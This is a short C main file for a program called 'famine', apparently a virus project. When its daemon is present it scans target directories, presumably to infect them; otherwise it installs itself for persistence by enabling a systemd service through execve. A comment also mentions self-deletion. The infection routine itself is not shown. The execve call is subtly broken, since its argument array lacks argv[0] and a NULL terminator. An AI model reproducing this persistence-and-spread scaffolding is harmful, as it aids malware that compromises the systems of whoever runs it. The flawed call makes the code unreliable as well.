#include "famine.h"

#include <stddef.h> // size_t, NULL

int main(void)
{
	const char *paths[] = {
		// "/tmp/test",
		// "/tmp/test2",
		"./tests",
		NULL
	};

	// check for the daemon
	if (daemon_is_present()) {
		// execute famine
		for (size_t i = 0; paths[i]; i++)
			scan_directory(paths[i]);
		return (0);
	}

	// install daemon
	const char *cmd = "/usr/bin/systemctl";
	char *cmd_args[3] = {"-q", "enable", "~/famine/daemon/famine.service"};
	execve(cmd, cmd_args, NULL);

	// delete famine (execve returns on failure)

	return (1);
}
